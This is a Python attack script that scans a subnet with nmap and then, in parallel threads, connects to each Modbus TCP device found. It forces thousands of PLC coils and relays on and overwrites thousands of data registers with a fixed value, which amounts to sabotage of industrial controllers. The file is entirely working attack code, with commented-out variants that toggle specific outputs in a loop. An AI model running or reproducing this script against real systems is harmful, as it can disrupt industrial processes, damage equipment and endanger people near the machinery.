#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# 啟動命令: sudo python3 auto_modbus_tcp_attack.py 192.168.3.0/24
# 使用多執行續原因是 如果多台設備時可以同時攻擊
import threading
import nmap3
import sys
import json
import time
from pyModbusTCP.client import ModbusClient

def spilt_sub_ip_name_string(message):
    value=message.rsplit('.',1)
    return value
# computer_information=[
#     {'ip':'192.168.3.40',
#      'port':[502,
#              503
#         ]
#      },
#       {'ip':'192.168.3.41',
#         'port':[502,
#                 503
#         ]
#      }
#     ]
print('------')
# print(computer_information[0]['ip'])
# print(computer_information[0]['port'][0])
# print(len(results[sys.argv[1]]))
print('******')
#---- scan host open port------#
ip_range=sys.argv[1]
sub_ip=spilt_sub_ip_name_string(str(ip_range))
sub_ip=sub_ip[0]+'.'
computer_information=[]
nmapp=nmap3.NmapHostDiscovery()
for i in range(11,14): #搜尋範圍 192.168.3.11~192.168.3.13
    scan_ip_address=sub_ip+str(i)
    print('ip='+scan_ip_address)
    results = nmapp.nmap_portscan_only(scan_ip_address)
    if len(results)>2: #有找到機器開機並開幾服務(port)
        data={}
        data['ip']=scan_ip_address
        data['port']=[]
        port_len=len(results[scan_ip_address]['ports'])
        for j in range(port_len):
            port_number=results[scan_ip_address]['ports'][j]['portid']
            data['port'].append(port_number)
        # 怕有些機器開啟不會回應502 port
        data['port']=502
        computer_information.append(data)
        print('-----------------------')
print('computer_information='+str(computer_information))
#------computer_information to json------
# jjson_str=json.dumps(computer_information)
# print('jjson_str='+str(jjson_str))

def modbus_tcp_attack_function(ip_address,ports): #測試 寫入功能
    modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    #write Coil 線圈
    print('-----attack PLC write Coil -----')
    for i in range(1024):
        for j in range(20):
            modbus_tcp_client.write_single_coil(i,True)
        print('Read Coil  '+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
    # modbus_tcp_client.close()
    #write M0 線圈暫存器
    print('-----attack PLC write M0 (Auxiliary relay) -----')
    for i in range(8192,15872):
        for j in range(20):
            modbus_tcp_client.write_single_coil(i,True)
        print('Read M'+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
    
    # modbus_tcp_client.close()
    #write D0 數據暫存器
    print('-----attack PLC write D0 (Data register) -----')
    # D_attack_Inform=['5376']
    for i in range(0,8000):
        for j in range(20):
            modbus_tcp_client.write_single_register(i,5376) #5376 = 我生氣了
        print('Read D'+str(i)+' is='+str(modbus_tcp_client.read_holding_registers(i)))
    modbus_tcp_client.close()
    
# modbus_tcp_client = ModbusClient(computer_information[0]['ip'],502,auto_open=True) #UID 可能可以不用設
# print('write Coil 8197 is='+str(modbus_tcp_client.write_single_coil(8197,False)))
# print('write Coil 8195 is='+str(modbus_tcp_client.write_single_coil(8195,False)))
# print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
# try:
#     while True:
#         modbus_tcp_client.write_single_coil(8197,False)
#         modbus_tcp_client.write_single_coil(8195,False)
#         print('Read Coil  8197 is='+str(modbus_tcp_client.read_coils(8197)))
#         print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
#         time.sleep(0.1)
#         modbus_tcp_client.write_single_coil(8197,True)
#         modbus_tcp_client.write_single_coil(8195,True)
#         print('Read Coil  8197 is='+str(modbus_tcp_client.read_coils(8197)))
#         print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
#         print('-------------------------------')
# except KeyboardInterrupt:
#     modbus_tcp_client.write_single_coil(8197,False)
#     modbus_tcp_client.write_single_coil(8195,False)
#     # modbus_tcp_client.write_single_coil(8197,True)
#     # modbus_tcp_client.write_single_coil(8195,True)
#     modbus_tcp_client.close()
threads=[]
for i in range(len(computer_information)):
    thread=threading.Thread(target=modbus_tcp_attack_function,args=(computer_information[i]['ip'],computer_information[i]['port'],))
    threads.append(thread)
    thread.start()

for thread in threads:  # iterates over the threads
    thread.join()       # waits until the thread has finished work
    
    






